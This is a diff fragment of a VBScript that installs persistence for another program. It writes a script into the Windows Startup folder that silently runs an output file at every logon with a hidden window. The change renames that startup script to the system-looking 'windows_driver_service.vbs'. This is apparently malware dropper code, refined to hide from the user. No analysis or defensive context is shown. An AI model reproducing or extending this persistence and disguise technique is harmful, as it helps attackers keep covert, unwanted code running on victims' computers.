@@ -66,7 +66,7 @@ If Not FSObj.FileExists(OutFile) Then
     WScript.Quit
 End If
 StartFldr=AppDat & "\Microsoft\Windows\Start Menu\Programs\Startup"
-StartScr=StartFldr & "\windows__client_service5.vbs"
+StartScr=StartFldr & "\windows_driver_service.vbs"
 Set StartFile=FSObj.CreateTextFile(StartScr,True)
 StartFile.WriteLine "Set WshShell = CreateObject(""WScript.Shell"")"
 StartFile.WriteLine "WshShell.Run """ & OutFile & """, 0, False"
